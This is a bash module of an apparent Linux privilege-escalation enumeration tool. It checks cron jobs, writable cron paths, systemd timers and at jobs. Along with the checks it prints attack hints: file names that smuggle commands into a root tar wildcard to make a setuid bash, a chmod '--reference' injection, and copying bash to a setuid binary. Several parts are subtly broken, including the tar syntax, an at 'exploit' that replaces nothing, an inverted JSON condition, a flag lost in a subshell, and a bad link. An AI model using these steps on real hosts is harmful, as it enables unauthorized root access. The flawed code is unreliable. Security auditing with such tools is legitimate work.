#!/bin/bash

source "$(dirname "${BASH_SOURCE[0]}")/../utils/helpers.sh"

check_cron_jobs() {
    print_title "CRON JOBS ANALYSIS"
    
    print_info "Checking system cron configuration..."
    
    print_subtitle "System crontab (/etc/crontab):"
    if [[ -r /etc/crontab ]]; then
        cat /etc/crontab 2>/dev/null | grep -v "^#" | grep -v "^$" | head -20 || print_info "Empty or no cron entries"
    else
        print_warn "Cannot read /etc/crontab"
    fi
    
    echo ""
    
    print_subtitle "Cron directories:"
    local cron_dirs="/etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly /etc/cron.yearly"
    
    for dir in $cron_dirs; do
        if [[ -d "$dir" ]]; then
            print_info "Directory: $dir"
            ls -la "$dir" 2>/dev/null | head -10
        fi
    done
    
    echo ""
    
    print_subtitle "User crontabs:"
    local user_crontabs=$(ls /var/spool/cron/crontabs/ 2>/dev/null)
    if [[ -n "$user_crontabs" ]]; then
        for user in $user_crontabs; do
            print_info "User: $user"
            cat "/var/spool/cron/crontabs/$user" 2>/dev/null | grep -v "^#" | grep -v "^$" | head -10 || print_info "Empty"
        done
    else
        print_warn "No user crontabs found or cannot access"
    fi
    
    echo ""
}

check_writable_cron() {
    print_title "WRITABLE CRON CONFIGURATIONS"
    
    local writable_found=false
    
    print_info "Checking for writable cron files and directories..."
    
    local cron_paths="/etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly /etc/cron.yearly /var/spool/cron /var/spool/cron/crontabs"
    
    for path in $cron_paths; do
        if [[ -d "$path" ]]; then
            if [[ -w "$path" ]]; then
                print_critical "Writable cron directory: $path"
                [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "cron" "critical" "Writable cron directory" "$path" "Add malicious cron job"
                writable_found=true
            fi
            
            find "$path" -type f -writable 2>/dev/null | while read -r file; do
                print_high "Writable cron file: $file"
                [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "cron" "high" "Writable cron file" "$file" "Modify for privilege escalation"
                writable_found=true
            done
        fi
    done
    
    if [[ "$writable_found" == "false" ]]; then
        print_good "No writable cron configurations found"
    fi
    
    echo ""
}

check_wildcard_injection() {
    print_title "WILDCARD INJECTION CHECK"
    
    print_info "Checking for wildcard vulnerabilities in cron jobs..."
    
    local wildcard_apps=("tar" "chmod" "chown" "cp" "mv" "rsync")
    
    print_subtitle "Processes running with wildcards:"
    
    for app in "${wildcard_apps[@]}"; do
        local procs=$(ps aux 2>/dev/null | grep -i "$app" | grep -v grep | head -5)
        if [[ -n "$procs" ]]; then
            print_warn "$app processes found:"
            echo "$procs" | while read -r line; do
                print_info "  $line"
            done
        fi
    done
    
    print_subtitle "Wildcard injection examples:"
    
    print_info "TAR wildcard injection:"
    print_command "# If cron runs: tar cf backup.tar *"
    print_command "# Create malicious files in directory:"
    print_command "echo 'cp /bin/bash /tmp/bash_suid' > --checkpoint-action=exec"
    print_command "echo 'chmod +s /tmp/bash_suid' > --checkpoint=1"
    print_command "# When tar runs, it executes these commands as root"
    print ""
    
    print_info "CHMOD wildcard injection:"
    print_command "# If cron runs: chmod 777 *"
    print_command "# Create file named --reference=.bashrc"
    print_command "touch -- '--reference=.bashrc'"
    print "# chmod interprets --reference as referencing .bashrc permissions"
    print ""
    
    print_info "CHOWN wildcard injection:"
    print_command "# Similar to chmod injection"
    print_command "# Can change file ownership"
    print ""
    
    print_link "Wildcard Injection" "https://www.exploit-db.com/docs/english/44592-linux wildcard-injection.pdf"
    
    echo ""
}

check_systemd_timers() {
    print_title "SYSTEMD TIMERS"
    
    if check_tool "systemctl"; then
        print_info "Listing systemd timers..."
        systemctl list-timers --all 2>/dev/null | head -30 || print_warn "Cannot access systemd"
    else
        print_warn "systemctl not found (not a systemd system)"
    fi
    
    print_subtitle "Timer exploitation:"
    print_command "# Check timers running as root"
    print_command "systemctl list-timers --all | grep root"
    print_command ""
    print_command "# If you can modify the service unit"
    print_command "# Add ExecStartPre to execute malicious command"
    print ""
    
    echo ""
}

check_at_jobs() {
    print_title "AT JOBS"
    
    if check_tool "atq"; then
        print_info "Pending at jobs:"
        atq 2>/dev/null || print_info "No pending at jobs"
        
        print_subtitle "At job exploitation:"
        print_command "# If at binary is writable"
        print_command "# Replace with malicious binary"
        print_command "cp /bin/bash /tmp/at"
        print_command "chmod +s /tmp/at"
    else
        print_warn "atq command not found"
    fi
    
    echo ""
}

run_cron_checks() {
    check_cron_jobs
    check_writable_cron
    check_wildcard_injection
    check_systemd_timers
    check_at_jobs
}
